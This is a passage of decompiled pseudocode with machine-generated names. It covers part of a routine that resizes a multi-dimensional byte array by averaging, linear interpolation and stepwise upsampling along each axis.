          ++v154;
          v755 = v703[1];
        }
        if ( !v754 )
        {
          ++v705;
          v754 = v734;
        }
        v155 = HIDWORD(v753);
        if ( !HIDWORD(v753) )
        {
LABEL_266:
          sub_42BBF0(&v727, (int)&v714);
          v706 = 0;
          LOBYTE(v756) = 0;
          sub_421DE0((void **)&v727);
          v12 = (int *)v703;
          v16 = v735;
          v18 = v734;
          v24 = v733;
          v152 = v703[2];
          v23 = v703[3];
LABEL_267:
          if ( v24 != v152 )
          {
            v704 = 0;
            sub_423A60(&v727, v16, v18, v24, v23, (float *)&v704);
            LOBYTE(v756) = 16;
            v172 = v12[2];
            v173 = 0;
            v174 = v733 * v172;
            v755 = v172;
            v754 = v733;
            v705 = 0;
            if ( v733 * v172 )
            {
              do
              {
                v175 = sub_423490(&v755, &v754);
                v176 = 0;
                v708 = 0;
                v177 = *v175;
                v755 -= v177;
                v754 -= v177;
                HIDWORD(v753) = v174 - v177;
                v178 = v730;
                Size = v177;
                if ( v706 )
                {
                  if ( v730 > 0 )
                  {
                    v179 = v728;
                    v180 = v727;
                    do
                    {
                      v181 = 0;
                      if ( v179 > 0 )
                      {
                        do
                        {
                          v182 = 0;
                          if ( v180 > 0 )
                          {
                            *((float *)&v699 + 1) = (float)Size;
                            do
                            {
                              *((float *)&v750 + 1) = (float)*(unsigned __int8 *)sub_422930(
                                                                                   v703,
                                                                                   v182,
                                                                                   v181,
                                                                                   v705,
                                                                                   v176)
                                                    * *((float *)&v699 + 1);
                              v183 = (float *)sub_423A30(&v727, v182++, v181, v173, v708);
                              v176 = v708;
                              *v183 = *((float *)&v750 + 1) + *v183;
                              v180 = v727;
                            }
                            while ( v182 < v727 );
                            v179 = v728;
                          }
                          ++v181;
                        }
                        while ( v181 < v179 );
                        v178 = v730;
                      }
                      v708 = ++v176;
                    }
                    while ( v176 < v178 );
                    goto LABEL_293;
                  }
                }
                else if ( v730 > 0 )
                {
                  v179 = v728;
                  v180 = v727;
                  do
                  {
                    v184 = 0;
                    if ( v179 > 0 )
                    {
                      do
                      {
                        v185 = 0;
                        if ( v180 > 0 )
                        {
                          *((float *)&v699 + 1) = (float)Size;
                          do
                          {
                            *((float *)&v750 + 1) = (float)*(unsigned __int8 *)sub_422930(&v714, v185, v184, v705, v176)
                                                  * *((float *)&v699 + 1);
                            v186 = (float *)sub_423A30(&v727, v185++, v184, v173, v708);
                            v176 = v708;
                            *v186 = *((float *)&v750 + 1) + *v186;
                            v180 = v727;
                          }
                          while ( v185 < v727 );
                          v179 = v728;
                        }
                        ++v184;
                      }
                      while ( v184 < v179 );
                      v178 = v730;
                    }
                    v708 = ++v176;
                  }
                  while ( v176 < v178 );
                  goto LABEL_293;
                }
                v179 = v728;
                v180 = v727;
LABEL_293:
                if ( !v755 )
                {
                  v187 = 0;
                  for ( HIDWORD(v702) = 0; v187 < v178; HIDWORD(v702) = v187 )
                  {
                    v188 = 0;
                    if ( v179 > 0 )
                    {
                      do
                      {
                        v189 = 0;
                        if ( v180 > 0 )
                        {
                          do
                          {
                            *((float *)&v699 + 1) = (float)v703[2];
                            v190 = (float *)sub_423A30(&v727, v189, v188, v173, v187);
                            v187 = HIDWORD(v702);
                            ++v189;
                            *v190 = *v190 / *((float *)&v699 + 1);
                            v180 = v727;
                          }
                          while ( v189 < v727 );
                          v179 = v728;
                        }
                        ++v188;
                      }
                      while ( v188 < v179 );
                      v178 = v730;
                    }
                    ++v187;
                  }
                  ++v173;
                  v755 = v703[2];
                }
                if ( !v754 )
                {
                  ++v705;
                  v754 = v733;
                }
                v174 = HIDWORD(v753);
              }
              while ( HIDWORD(v753) );
            }
            sub_42BBF0(&v727, (int)&v714);
            v706 = 0;
            LOBYTE(v756) = 0;
            sub_421DE0((void **)&v727);
            v12 = (int *)v703;
            v16 = v735;
            v18 = v734;
            v24 = v733;
            v23 = v703[3];
          }
          if ( v726 != v23 )
          {
            v704 = 0;
            sub_423A60(&v727, v16, v18, v24, v726, (float *)&v704);
            LOBYTE(v756) = 17;
            v191 = v12[3];
            v192 = 0;
            v193 = v726 * v191;
            v755 = v191;
            v754 = v726;
            v705 = 0;
            if ( v726 * v191 )
            {
              do
              {
                v194 = sub_423490(&v755, &v754);
                v195 = 0;
                v708 = 0;
                v196 = *v194;
                v755 -= v196;
                v754 -= v196;
                HIDWORD(v753) = v193 - v196;
                v197 = v729;
                Size = v196;
                if ( v706 )
                {
                  if ( v729 > 0 )
                  {
                    v198 = v728;
                    v199 = v727;
                    do
                    {
                      v200 = 0;
                      if ( v198 > 0 )
                      {
                        do
                        {
                          v201 = 0;
                          if ( v199 > 0 )
                          {
                            *((float *)&v699 + 1) = (float)Size;
                            do
                            {
                              *((float *)&v750 + 1) = (float)*(unsigned __int8 *)sub_422930(
                                                                                   v703,
                                                                                   v201,
                                                                                   v200,
                                                                                   v195,
                                                                                   v705)
                                                    * *((float *)&v699 + 1);
                              v202 = (float *)sub_423A30(&v727, v201++, v200, v708, v192);
                              v195 = v708;
                              *v202 = *((float *)&v750 + 1) + *v202;
                              v199 = v727;
                            }
                            while ( v201 < v727 );
                            v198 = v728;
                          }
                          ++v200;
                        }
                        while ( v200 < v198 );
                        v197 = v729;
                      }
                      v708 = ++v195;
                    }
                    while ( v195 < v197 );
                    goto LABEL_333;
                  }
                }
                else if ( v729 > 0 )
                {
                  v198 = v728;
                  v199 = v727;
                  do
                  {
                    v203 = 0;
                    if ( v198 > 0 )
                    {
                      do
                      {
                        v204 = 0;
                        if ( v199 > 0 )
                        {
                          *((float *)&v699 + 1) = (float)Size;
                          do
                          {
                            *((float *)&v750 + 1) = (float)*(unsigned __int8 *)sub_422930(&v714, v204, v203, v195, v705)
                                                  * *((float *)&v699 + 1);
                            v205 = (float *)sub_423A30(&v727, v204++, v203, v708, v192);
                            v195 = v708;
                            *v205 = *((float *)&v750 + 1) + *v205;
                            v199 = v727;
                          }
                          while ( v204 < v727 );
                          v198 = v728;
                        }
                        ++v203;
                      }
                      while ( v203 < v198 );
                      v197 = v729;
                    }
                    v708 = ++v195;
                  }
                  while ( v195 < v197 );
                  goto LABEL_333;
                }
                v198 = v728;
                v199 = v727;
LABEL_333:
                if ( !v755 )
                {
                  v206 = 0;
                  for ( HIDWORD(v702) = 0; v206 < v197; HIDWORD(v702) = v206 )
                  {
                    v207 = 0;
                    if ( v198 > 0 )
                    {
                      do
                      {
                        v208 = 0;
                        if ( v199 > 0 )
                        {
                          do
                          {
                            *((float *)&v699 + 1) = (float)v703[3];
                            v209 = (float *)sub_423A30(&v727, v208, v207, v206, v192);
                            v206 = HIDWORD(v702);
                            ++v208;
                            *v209 = *v209 / *((float *)&v699 + 1);
                            v199 = v727;
                          }
                          while ( v208 < v727 );
                          v198 = v728;
                        }
                        ++v207;
                      }
                      while ( v207 < v198 );
                      v197 = v729;
                    }
                    ++v206;
                  }
                  ++v192;
                  v755 = v703[3];
                }
                if ( !v754 )
                {
                  ++v705;
                  v754 = v726;
                }
                v193 = HIDWORD(v753);
              }
              while ( HIDWORD(v753) );
            }
            sub_42BBF0(&v727, (int)&v714);
            LOBYTE(v756) = 0;
            sub_421DE0((void **)&v727);
          }
LABEL_347:
          sub_422960(v691, (int)&v714);
          sub_421DE0((void **)&v714);
          return v691;
        }
      }
    case 3:
      v210 = sub_42BBC0(&v735, &v734, &v733, &v726);
      sub_421DF0(v709, v210, 1, 1, 1);
      LOBYTE(v756) = 18;
      sub_423900(v711, (unsigned int)v709[0], 1, 1, 1);
      LOBYTE(v756) = 19;
      sub_4223B0(&v727);
      LOBYTE(v756) = 20;
      sub_4223B0(&v741);
      LOBYTE(v756) = 21;
      sub_4223B0(&v736);
      LOBYTE(v756) = 22;
      sub_4223B0(&v720);
      v211 = a8;
      LOBYTE(v756) = 23;
      v212 = *v12;
      v750 = 0.0;
      if ( v735 == v212 )
      {
        sub_42BCD0((int)&v727, v12, 1);
        goto LABEL_379;
      }
      if ( v212 == 1 )
      {
        v213 = sub_424050(v697, v735, v12[1], v12[2], v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 24;
LABEL_353:
        sub_423F60(v213, (int)&v727);
        LOBYTE(v756) = 23;
        sub_421DE0(v697);
        goto LABEL_379;
      }
      if ( v212 > v735 )
      {
        v213 = sub_424050(v697, v735, v12[1], v12[2], v12[3], 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 25;
        goto LABEL_353;
      }
      if ( a8 || v735 <= v212 )
      {
        v216 = _mm_cvtsi32_si128(v735);
        v217 = (double)v212;
        v215 = v735;
      }
      else
      {
        if ( v735 <= 1 )
        {
          v699 = 0.0;
          goto LABEL_361;
        }
        v214 = (double)v212;
        v215 = v735 - 1;
        v216 = _mm_cvtsi32_si128(v735 - 1);
        v217 = v214 - 1.0;
      }
      v699 = v217 / (_mm_cvtepi32_pd(v216).m128d_f64[0] + *(double *)&qword_4EA220[v215 >> 31]);
LABEL_361:
      sub_42A620((int)&v727, v735, v12[1], v12[2], v12[3]);
      v218 = 0.0;
      v219 = (_DWORD *)v710;
      v220 = (double *)Block;
      Size = 0;
      if ( v727 > 0 )
      {
        v221 = 0;
        do
        {
          v222 = v221;
          v753 = v218 + v699;
          *v220 = v218 - (double)v221;
          v704 = (unsigned int)(v220 + 1);
          v752 = (double)sub_409B40(v12) - 1.0;
          v753 = *sub_42BBB0(&v752, &v753);
          v221 = (unsigned int)v753;
          v218 = v753;
          *v219++ = (unsigned int)v753 - v222;
          v223 = (int)++Size < v727;
          v220 = (double *)v704;
        }
        while ( v223 );
      }
      v224 = v730;
      v225 = 0;
      v705 = 0;
      if ( v730 > 0 )
      {
        v226 = v729;
        v227 = v728;
        do
        {
          v228 = 0;
          v708 = 0;
          if ( v226 > 0 )
          {
            do
            {
              v229 = 0;
              HIDWORD(v753) = 0;
              if ( v227 > 0 )
              {
                do
                {
                  v230 = (unsigned __int8 *)sub_422930(v12, 0, v229, v228, v225);
                  v704 = (unsigned int)&v230[*v12 - 1];
                  v231 = (_BYTE *)sub_422930(&v727, 0, v229, v708, v705);
                  v232 = (int *)v710;
                  v233 = (double *)Block;
                  Size = 0;
                  if ( v727 > 0 )
                  {
                    do
                    {
                      v234 = *v233++;
                      if ( (unsigned int)v230 >= v704 )
                        v235 = *v230;
                      else
                        v235 = v230[1];
                      v236 = (double)*v230;
                      v237 = v235;
                      v238 = ++Size;
                      *v231++ = (int)((1.0 - v234) * v236 + (double)v237 * v234);
                      v239 = *v232++;
                      v230 += v239;
                    }
                    while ( v238 < v727 );
                  }
                  v227 = v728;
                  v229 = HIDWORD(v753) + 1;
                  v12 = (int *)v703;
                  v228 = v708;
                  v225 = v705;
                  HIDWORD(v753) = v229;
                }
                while ( v229 < v728 );
                v226 = v729;
              }
              v708 = ++v228;
            }
            while ( v228 < v226 );
            v224 = v730;
          }
          v705 = ++v225;
        }
        while ( v225 < v224 );
      }
      v211 = a8;
LABEL_379:
      v240 = v12[1];
      if ( v734 == v240 )
      {
        sub_42BCD0((int)&v741, &v727, 1);
        goto LABEL_413;
      }
      if ( v240 == 1 )
      {
        v241 = sub_424050(v697, v735, v734, v12[2], v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 26;
LABEL_385:
        sub_423F60(v241, (int)&v741);
        LOBYTE(v756) = 23;
        sub_421DE0(v697);
        sub_424010((void **)&v727);
        goto LABEL_413;
      }
      if ( v240 > v734 )
      {
        v241 = sub_424050(v697, v735, v734, v12[2], v12[3], 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 27;
        goto LABEL_385;
      }
      if ( v211 || v734 <= v240 )
      {
        v244 = _mm_cvtsi32_si128(v734);
        v245 = (double)v240;
        v243 = v734;
      }
      else
      {
        if ( v734 <= 1 )
        {
          v699 = 0.0;
          goto LABEL_393;
        }
        v242 = (double)v240;
        v243 = v734 - 1;
        v244 = _mm_cvtsi32_si128(v734 - 1);
        v245 = v242 - 1.0;
      }
      v699 = v245 / (_mm_cvtepi32_pd(v244).m128d_f64[0] + *(double *)&qword_4EA220[v243 >> 31]);
LABEL_393:
      sub_42A620((int)&v741, v735, v734, v12[2], v12[3]);
      v246 = 0.0;
      v247 = (_DWORD *)v710;
      v248 = (double *)Block;
      Size = 0;
      if ( v742 > 0 )
      {
        v249 = 0;
        do
        {
          v250 = v249;
          *v248 = v246 - (double)v249;
          v704 = (unsigned int)(v248 + 1);
          v753 = v699 + v246;
          v752 = (double)sub_422EF0(v12) - 1.0;
          v753 = *sub_42BBB0(&v752, &v753);
          v249 = (unsigned int)v753;
          v246 = v753;
          *v247++ = v735 * ((unsigned int)v753 - v250);
          v223 = (int)++Size < v742;
          v248 = (double *)v704;
        }
        while ( v223 );
      }
      v251 = v744;
      v252 = 0;
      v705 = 0;
      if ( v744 > 0 )
      {
        v253 = v743;
        v254 = v741;
        do
        {
          v255 = 0;
          v708 = 0;
          if ( v253 > 0 )
          {
            do
            {
              v256 = 0;
              HIDWORD(v753) = 0;
              if ( v254 > 0 )
              {
                do
                {
                  v257 = (unsigned __int8 *)sub_422930(&v727, v256, 0, v255, v252);
                  v704 = (unsigned int)&v257[v735 * (v12[1] - 1)];
                  v258 = (_BYTE *)sub_422930(&v741, v256, 0, v708, v705);
                  v259 = (int *)v710;
                  v260 = (double *)Block;
                  Size = 0;
                  if ( v742 > 0 )
                  {
                    v261 = v735;
                    do
                    {
                      ++v260;
                      if ( (unsigned int)v257 >= v704 )
                        v262 = *v257;
                      else
                        v262 = v257[v261];
                      *v258 = (int)((1.0 - *(v260 - 1)) * (double)*v257 + (double)v262 * *(v260 - 1));
                      v263 = *v259++;
                      v261 = v735;
                      v257 += v263;
                      v258 += v735;
                      ++Size;
                    }
                    while ( (int)Size < v742 );
                  }
                  v254 = v741;
                  v256 = HIDWORD(v753) + 1;
                  v12 = (int *)v703;
                  v255 = v708;
                  v252 = v705;
                  HIDWORD(v753) = v256;
                }
                while ( v256 < v741 );
                v253 = v743;
              }
              v708 = ++v255;
            }
            while ( v255 < v253 );
            v251 = v744;
          }
          v705 = ++v252;
        }
        while ( v252 < v251 );
      }
      sub_424010((void **)&v727);
LABEL_413:
      v264 = v12[2];
      if ( v733 == v264 )
      {
        sub_42BCD0((int)&v736, &v741, 1);
        goto LABEL_444;
      }
      if ( v264 == 1 )
      {
        v265 = sub_424050(v697, v735, v734, v733, v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 28;
LABEL_418:
        sub_423F60(v265, (int)&v736);
        LOBYTE(v756) = 23;
        sub_421DE0(v697);
        sub_424010((void **)&v741);
        goto LABEL_444;
      }
      if ( v264 > v733 )
      {
        v265 = sub_424050(v697, v735, v734, v733, v12[3], 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 29;
        goto LABEL_418;
      }
      if ( a8 || v733 <= v264 )
      {
        v268 = _mm_cvtsi32_si128(v733);
        v269 = (double)v264;
        v267 = v733;
      }
      else
      {
        if ( v733 <= 1 )
        {
          v699 = 0.0;
          goto LABEL_426;
        }
        v266 = (double)v264;
        v267 = v733 - 1;
        v268 = _mm_cvtsi32_si128(v733 - 1);
        v269 = v266 - 1.0;
      }
      v699 = v269 / (_mm_cvtepi32_pd(v268).m128d_f64[0] + *(double *)&qword_4EA220[v267 >> 31]);
LABEL_426:
      v270 = v703;
      v271 = v735 * v734;
      v682 = v703[3];
      v708 = v735 * v734;
      sub_42A620((int)&v736, v735, v734, v733, v682);
      v272 = 0.0;
      v273 = (double *)Block;
      Size = v710;
      HIDWORD(v753) = 0;
      if ( v738 > 0 )
      {
        v274 = 0;
        do
        {
          v275 = v274;
          *v273 = v272 - (double)v274;
          v704 = (unsigned int)(v273 + 1);
          v752 = v699 + v272;
          *(double *)v689 = (double)sub_42A5B0(v270) - 1.0;
          v752 = *sub_42BBB0((double *)v689, &v752);
          v274 = (unsigned int)v752;
          v276 = Size;
          v272 = v752;
          *(_DWORD *)Size = v271 * ((unsigned int)v752 - v275);
          Size = v276 + 4;
          v223 = ++HIDWORD(v753) < v738;
          v273 = (double *)v704;
        }
        while ( v223 );
      }
      v277 = 0;
      HIDWORD(v694) = 0;
      if ( v739 <= 0 )
      {
        v12 = (int *)v270;
        sub_424010((void **)&v741);
      }
      else
      {
        v278 = v736;
        v279 = v737;
        do
        {
          v280 = 0;
          v705 = 0;
          if ( v279 > 0 )
          {
            do
            {
              v281 = 0;
              HIDWORD(v702) = 0;
              if ( v278 > 0 )
              {
                do
                {
                  v282 = (unsigned __int8 *)sub_422930(&v741, v281, v280, 0, v277);
                  v704 = (unsigned int)&v282[v271 * (v270[2] - 1)];
                  v283 = (_BYTE *)sub_422930(&v736, SHIDWORD(v702), v705, 0, SHIDWORD(v694));
                  v284 = (int *)v710;
                  v285 = (double *)Block;
                  Size = 0;
                  if ( v738 > 0 )
                  {
                    do
                    {
                      v286 = *v285++;
                      if ( (unsigned int)v282 >= v704 )
                        v287 = *v282;
                      else
                        v287 = v282[v708];
                      v288 = (double)*v282;
                      v289 = v287;
                      v290 = ++Size;
                      *v283 = (int)((1.0 - v286) * v288 + (double)v289 * v286);
                      v291 = *v284++;
                      v283 += v708;
                      v282 += v291;
                    }
                    while ( v290 < v738 );
                  }
                  v278 = v736;
                  v281 = HIDWORD(v702) + 1;
                  v271 = v708;
                  v270 = v703;
                  v280 = v705;
                  v277 = HIDWORD(v694);
                  HIDWORD(v702) = v281;
                }
                while ( v281 < v736 );
              }
              v279 = v737;
              v705 = ++v280;
            }
            while ( v280 < v737 );
          }
          HIDWORD(v694) = ++v277;
        }
        while ( v277 < v739 );
        v12 = (int *)v703;
        sub_424010((void **)&v741);
      }
LABEL_444:
      v292 = v12[3];
      if ( v726 == v292 )
      {
        sub_42BCD0((int)&v720, &v736, 1);
        goto LABEL_475;
      }
      if ( v292 == 1 )
      {
        v293 = sub_424050(v697, v735, v734, v733, v726, 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 30;
LABEL_449:
        sub_423F60(v293, (int)&v720);
        LOBYTE(v756) = 23;
        sub_421DE0(v697);
        sub_424010((void **)&v736);
        goto LABEL_475;
      }
      if ( v292 > v726 )
      {
        v293 = sub_424050(v697, v735, v734, v733, v726, 2, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 31;
        goto LABEL_449;
      }
      if ( a8 || v726 <= v292 )
      {
        v296 = _mm_cvtsi32_si128(v726);
        v297 = (double)v292;
        v295 = v726;
      }
      else
      {
        if ( v726 <= 1 )
        {
          v699 = 0.0;
          goto LABEL_457;
        }
        v294 = (double)v292;
        v295 = v726 - 1;
        v296 = _mm_cvtsi32_si128(v726 - 1);
        v297 = v294 - 1.0;
      }
      v699 = v297 / (_mm_cvtepi32_pd(v296).m128d_f64[0] + *(double *)&qword_4EA220[v295 >> 31]);
LABEL_457:
      v298 = v735 * v734 * v733;
      v708 = v298;
      sub_42A620((int)&v720, v735, v734, v733, v726);
      v299 = (double *)Block;
      v300 = v703;
      Size = v710;
      HIDWORD(v753) = 0;
      if ( v723 > 0 )
      {
        v301 = 0;
        do
        {
          v302 = v301;
          v303 = v750;
          v750 = v750 + v699;
          *v299 = v303 - (double)v301;
          v704 = (unsigned int)(v299 + 1);
          v752 = (double)sub_41C280(v300) - 1.0;
          v750 = *sub_42BBB0(&v752, &v750);
          v301 = (unsigned int)v750;
          v304 = Size;
          *(_DWORD *)Size = v298 * ((unsigned int)v750 - v302);
          Size = v304 + 4;
          v223 = ++HIDWORD(v753) < v723;
          v299 = (double *)v704;
        }
        while ( v223 );
      }
      v305 = 0;
      HIDWORD(v694) = 0;
      if ( v722 > 0 )
      {
        v306 = v720;
        v307 = v721;
        do
        {
          v308 = 0;
          v705 = 0;
          if ( v307 > 0 )
          {
            do
            {
              v309 = 0;
              HIDWORD(v702) = 0;
              if ( v306 > 0 )
              {
                do
                {
                  v310 = (unsigned __int8 *)sub_422930(&v736, v309, v308, v305, 0);
                  v704 = (unsigned int)&v310[v298 * (v300[3] - 1)];
                  v311 = (_BYTE *)sub_422930(&v720, SHIDWORD(v702), v705, SHIDWORD(v694), 0);
                  v312 = (int *)v710;
                  v313 = (double *)Block;
                  Size = 0;
                  if ( v723 > 0 )
                  {
                    do
                    {
                      v314 = *v313++;
                      if ( (unsigned int)v310 >= v704 )
                        v315 = *v310;
                      else
                        v315 = v310[v708];
                      v316 = (double)*v310;
                      v317 = v315;
                      v318 = ++Size;
                      *v311 = (int)((1.0 - v314) * v316 + (double)v317 * v314);
                      v319 = *v312++;
                      v311 += v708;
                      v310 += v319;
                    }
                    while ( v318 < v723 );
                  }
                  v306 = v720;
                  v309 = HIDWORD(v702) + 1;
                  v298 = v708;
                  v300 = v703;
                  v308 = v705;
                  v305 = HIDWORD(v694);
                  HIDWORD(v702) = v309;
                }
                while ( v309 < v720 );
              }
              v307 = v721;
              ++v308;
              v300 = v703;
              v705 = v308;
            }
            while ( v308 < v721 );
          }
          v300 = v703;
          HIDWORD(v694) = ++v305;
        }
        while ( v305 < v722 );
      }
      v12 = (int *)v703;
      sub_424010((void **)&v736);
LABEL_475:
      if ( v724 )
      {
        if ( v740 )
        {
          if ( v745 )
          {
            if ( v731 )
            {
              v320 = sub_423F40(v12, v690);
              LOBYTE(v756) = 32;
              v321 = 2;
            }
            else
            {
              v320 = sub_422960(v683, (int)&v727);
              v756 = 33;
              v321 = 4;
            }
            v701 = v321;
            v322 = sub_422960(v684, (int)v320);
            v756 = 34;
            v323 = v321 | 8;
          }
          else
          {
            v322 = sub_422960(v685, (int)&v741);
            v756 = 35;
            v323 = 16;
          }
          v701 = v323;
          v324 = sub_422960(v686, (int)v322);
          v756 = 36;
          v325 = v323 | 0x20;
        }
        else
        {
          v324 = sub_422960(v687, (int)&v736);
          v756 = 37;
          v325 = 64;
        }
        v701 = v325;
        v326 = sub_422960(&v746, (int)v324);
        v756 = 38;
        v327 = v325 | 0x80;
      }
      else
      {
        v326 = sub_422960(v697, (int)&v720);
        v756 = 39;
        v327 = 256;
      }
      v328 = v691;
      v701 = v327;
      sub_422960(v691, (int)v326);
      v329 = v327 | 1;
      if ( (v329 & 0x100) != 0 )
        sub_421DE0(v697);
      if ( (v329 & 0x80u) != 0 )
      {
        LOBYTE(v329) = v329 & 0x7F;
        sub_421DE0((void **)&v746);
      }
      if ( (v329 & 0x40) != 0 )
      {
        LOBYTE(v329) = v329 & 0xBF;
        sub_421DE0(v687);
      }
      if ( (v329 & 0x20) != 0 )
      {
        LOBYTE(v329) = v329 & 0xDF;
        sub_421DE0(v686);
      }
      if ( (v329 & 0x10) != 0 )
      {
        LOBYTE(v329) = v329 & 0xEF;
        sub_421DE0(v685);
      }
      if ( (v329 & 8) != 0 )
      {
        LOBYTE(v329) = v329 & 0xF7;
        sub_421DE0(v684);
      }
      if ( (v329 & 4) != 0 )
      {
        LOBYTE(v329) = v329 & 0xFB;
        sub_421DE0(v683);
      }
      if ( (v329 & 2) != 0 )
        sub_421DE0(v690);
      sub_421DE0((void **)&v720);
      sub_421DE0((void **)&v736);
      sub_421DE0((void **)&v741);
      v330 = (void **)&v727;
      goto LABEL_504;
    case 4:
      sub_4223B0(&v736);
      LOBYTE(v756) = 40;
      sub_4223B0(&v741);
      LOBYTE(v756) = 41;
      sub_4223B0(&v727);
      LOBYTE(v756) = 42;
      sub_4223B0(&v746);
      LOBYTE(v756) = 43;
      if ( v735 == *v12 )
      {
        sub_42BCD0((int)&v736, v12, 1);
      }
      else if ( v735 >= *v12 )
      {
        v706 = 0;
        sub_42A5C0(&v736, v735, v12[1], v12[2], v12[3], &v706);
        HIDWORD(v699) = 2 * v735;
        v704 = 2 * sub_409B40(v12);
        v332 = sub_409B40(v12);
        v333 = 0;
        v700 = 0;
        v334 = (float)(v735 * v704 / v332 - v704);
        v335 = 0;
        HIDWORD(v702) = 0;
        v755 = (int)(float)((float)(v334 * a9) + (float)(int)v704);
        if ( v736 > 0 )
        {
          v336 = v737;
          v337 = v739;
          v338 = v736;
          do
          {
            v755 -= v704;
            v12 = (int *)v703;
            if ( v755 <= 0 )
            {
              v339 = 0;
              v708 = 0;
              if ( v337 > 0 )
              {
                v340 = v738;
                v341 = v739;
                do
                {
                  v342 = 0;
                  if ( v340 > 0 )
                  {
                    do
                    {
                      v343 = 0;
                      if ( v336 > 0 )
                      {
                        do
                        {
                          v344 = *(_BYTE *)sub_422930(v12, SHIDWORD(v702), v343, v342, v339);
                          v345 = (_BYTE *)sub_422930(&v736, v700, v343, v342, v708);
                          v339 = v708;
                          ++v343;
                          *v345 = v344;
                          v336 = v737;
                          v12 = (int *)v703;
                        }
                        while ( v343 < v737 );
                        v340 = v738;
                      }
                      ++v342;
                    }
                    while ( v342 < v340 );
                    v341 = v739;
                  }
                  v708 = ++v339;
                }
                while ( v339 < v341 );
                v333 = v700;
                v335 = HIDWORD(v702);
                v337 = v739;
              }
              ++v335;
              v755 += HIDWORD(v699);
              v338 = v736;
              HIDWORD(v702) = v335;
            }
            v700 = ++v333;
          }
          while ( v333 < v338 );
        }
      }
      else
      {
        v331 = sub_424050(v690, v735, v12[1], v12[2], v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 44;
        sub_423F60(v331, (int)&v736);
        LOBYTE(v756) = 43;
        sub_421DE0(v690);
      }
      if ( v734 == v12[1] )
      {
        sub_42BCD0((int)&v741, &v736, 1);
      }
      else if ( v734 >= v12[1] )
      {
        v706 = 0;
        sub_42A5C0(&v741, v735, v734, v12[2], v12[3], &v706);
        HIDWORD(v699) = 2 * v734;
        v347 = 2 * sub_422EF0(v12);
        v704 = v347;
        v348 = sub_422EF0(v12);
        v349 = 0;
        v700 = 0;
        v350 = (float)(v734 * v347 / v348 - v347);
        v351 = _mm_cvtsi32_si128(v347);
        v352 = 0;
        HIDWORD(v702) = 0;
        v755 = (int)(float)((float)(v350 * a10) + _mm_cvtepi32_ps(v351).m128_f32[0]);
        if ( v742 > 0 )
        {
          v353 = v743;
          v354 = v744;
          v355 = v742;
          do
          {
            v755 -= v704;
            v356 = v741;
            if ( v755 <= 0 )
            {
              v357 = 0;
              v708 = 0;
              if ( v354 > 0 )
              {
                v358 = v744;
                do
                {
                  v359 = 0;
                  if ( v353 > 0 )
                  {
                    do
                    {
                      v360 = 0;
                      if ( v356 > 0 )
                      {
                        do
                        {
                          v361 = *(_BYTE *)sub_422930(&v736, v360, SHIDWORD(v702), v359, v357);
                          v362 = (_BYTE *)sub_422930(&v741, v360, v700, v359, v708);
                          v357 = v708;
                          ++v360;
                          *v362 = v361;
                          v356 = v741;
                        }
                        while ( v360 < v741 );
                        v353 = v743;
                      }
                      ++v359;
                    }
                    while ( v359 < v353 );
                    v358 = v744;
                  }
                  v708 = ++v357;
                }
                while ( v357 < v358 );
                v349 = v700;
                v352 = HIDWORD(v702);
                v354 = v744;
              }
              ++v352;
              v755 += HIDWORD(v699);
              v355 = v742;
              HIDWORD(v702) = v352;
            }
            v700 = ++v349;
          }
          while ( v349 < v355 );
          v12 = (int *)v703;
        }
        sub_424010((void **)&v736);
      }
      else
      {
        v346 = sub_424050(v690, v735, v734, v12[2], v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 45;
        sub_423F60(v346, (int)&v741);
        LOBYTE(v756) = 43;
        sub_421DE0(v690);
        sub_424010((void **)&v736);
      }
      if ( v733 == v12[2] )
      {
        sub_42BCD0((int)&v727, &v741, 1);
      }
      else if ( v733 >= v12[2] )
      {
        v706 = 0;
        sub_42A5C0(&v727, v735, v734, v733, v12[3], &v706);
        HIDWORD(v699) = 2 * v733;
        v364 = 2 * sub_42A5B0(v12);
        v704 = v364;
        v365 = sub_42A5B0(v12);
        v366 = 0;
        v700 = 0;
        v367 = (float)(v733 * v364 / v365 - v364);
        v368 = _mm_cvtsi32_si128(v364);
        v369 = 0;
        HIDWORD(v702) = 0;
        v755 = (int)(float)((float)(v367 * a11) + _mm_cvtepi32_ps(v368).m128_f32[0]);
        if ( v729 > 0 )
        {
          v370 = v728;
          v371 = v730;
          v372 = v729;
          do
          {
            v755 -= v704;
            v373 = v727;
            if ( v755 <= 0 )
            {
              v374 = 0;
              v708 = 0;
              if ( v371 > 0 )
              {
                v375 = v730;
                do
                {
                  v376 = 0;
                  if ( v370 > 0 )
                  {
                    do
                    {
                      v377 = 0;
                      if ( v373 > 0 )
                      {
                        do
                        {
                          v378 = *(_BYTE *)sub_422930(&v741, v377, v376, SHIDWORD(v702), v374);
                          v379 = (_BYTE *)sub_422930(&v727, v377, v376, v700, v708);
                          v374 = v708;
                          ++v377;
                          *v379 = v378;
                          v373 = v727;
                        }
                        while ( v377 < v727 );
                        v370 = v728;
                      }
                      ++v376;
                    }
                    while ( v376 < v370 );
                    v375 = v730;
                  }
                  v708 = ++v374;
                }
                while ( v374 < v375 );
                v366 = v700;
                v369 = HIDWORD(v702);
                v371 = v730;
              }
              ++v369;
              v755 += HIDWORD(v699);
              v372 = v729;
              HIDWORD(v702) = v369;
            }
            v700 = ++v366;
          }
          while ( v366 < v372 );
          v12 = (int *)v703;
        }
        sub_424010((void **)&v741);
      }
      else
      {
        v363 = sub_424050(v690, v735, v734, v733, v12[3], 1, 0, 0, 0, 0, 0);
        LOBYTE(v756) = 46;
        sub_423F60(v363, (int)&v727);
        LOBYTE(v756) = 43;
        sub_421DE0(v690);
        sub_424010((void **)&v741);
      }
      if ( v726 == v12[3] )
      {
        sub_42BCD0((int)&v746, &v727, 1);
      }
      else if ( v726 >= v12[3] )
      {
        v706 = 0;
        sub_42A5C0(&v746, v735, v734, v733, v726, &v706);
        HIDWORD(v699) = 2 * v726;
        v381 = 2 * sub_41C280(v12);
        v704 = v381;
        v382 = sub_41C280(v12);
        v383 = 0;
        v700 = 0;
        v384 = (float)(v726 * v381 / v382 - v381);
